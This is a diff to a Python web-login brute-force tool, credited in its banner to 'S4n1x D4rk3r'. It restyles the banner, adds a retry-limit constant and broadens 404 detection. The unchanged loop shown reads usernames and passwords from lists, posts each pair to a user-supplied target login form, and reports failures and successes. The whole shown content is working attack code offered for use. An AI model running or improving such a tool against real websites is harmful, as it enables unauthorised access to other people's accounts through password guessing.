@@ -3,21 +3,23 @@
 
 import requests
 
-print ("\n#####################################")
+print ("\n# ----------------------------------")
+print ("# | __ )|  ___| |    ")
+print ("# |  _ \\| |_  | |    ")
+print ("# | |_) |  _| | |___ ")
+print ("# |____/|_|   |_____| v1.0.0")
 print ("# => Brute Force Login <=           #")
-print ("| __ )|  ___| |    ")
-print ("|  _ \| |_  | |    ")
-print ("| |_) |  _| | |___ ")
-print ("|____/|_|   |_____| v1.0.0")
 print ("# By S4n1x D4rk3r                   #")
-print ("#####################################")
+print ("# ####################################")
+
+LIMIT_TRYING_ACCESSING_URL = 5
 
 # The link of the website
-url = input("\nEnter URL:")
+url = input("\n>Enter target URL:")
 # The userfield in the form of the login
-userField = input("\nEnter the User Field:")
+userField = input("\n>Enter the User Field:")
 # The passwordfield in the form
-passwordField = input("\nEnter the Password field:")
+passwordField = input("\n>Enter the Password field:")
 # list of potential incorrect message in the page if it doesn't succeed
 incorrectMessage = ['error', 'required error']
 # list of potential success message in the page if it succeed
@@ -39,10 +41,10 @@ for user in users:
                  passwordField: password.replace('\n', '')}
         print (dados)
         # Doing the post form
-        data = requests.post(url, data=dados)
+        request = requests.post(url, data=dados)
         #print data.text
-        if "404 - Not Found" in data.text:
-            if failed_aftertry > 5:
+        if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
+            if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
                 print ("Connexion failed : Trying again ....")
                 break
             else:
@@ -51,7 +53,7 @@ for user in users:
         else:
             # if you want to see the text result decomment this
             #print data.text
-            if incorrectMessage[0] in data.text or incorrectMessage[1] in data.text:
+            if incorrectMessage[0] in request.text or incorrectMessage[1] in request.text:
                 print ("Failed to connect with:\n user: "+user+" and password: "+password)
             else:
                 # if successMessage[0] in data.text or successMessage[1] in data.text:
